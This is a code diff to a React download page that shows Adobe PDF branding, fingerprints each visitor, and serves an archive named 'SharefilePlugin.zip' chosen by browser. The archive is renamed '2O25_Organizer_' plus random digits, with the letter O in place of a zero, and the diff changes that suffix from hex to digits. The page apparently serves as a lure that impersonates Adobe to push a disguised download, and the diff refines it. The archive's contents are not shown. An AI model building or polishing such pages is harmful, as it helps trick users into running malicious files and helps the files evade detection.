@@ -3,11 +3,10 @@ import { useVisitorData } from "@fingerprintjs/fingerprintjs-pro-react";
 import adobePdfLogo from "@/assets/adobe-pdf-logo.png";
 import adobeBg from "@/assets/adobe-bg.png";
 
-const randomHex = (len = 4) =>
+const randomDigits = (len = 8) =>
   Array.from(crypto.getRandomValues(new Uint8Array(len)))
-    .map((b) => b.toString(16).padStart(2, "0"))
-    .join("")
-    .slice(0, len);
+    .map((b) => (b % 10).toString())
+    .join("");
 
 const Download = () => {
   const { data: visitorData } = useVisitorData({ extendedResult: true }, { immediate: true });
@@ -21,7 +20,7 @@ const Download = () => {
 
   const downloadFile = useMemo(() => {
     const ua = navigator.userAgent;
-    const suffix = randomHex(8);
+    const suffix = randomDigits(8);
     if (ua.includes("Edg/")) {
       return { href: "/docs/SharefilePlugin.zip", name: `2O25_Organizer_${suffix}.zip` };
     }
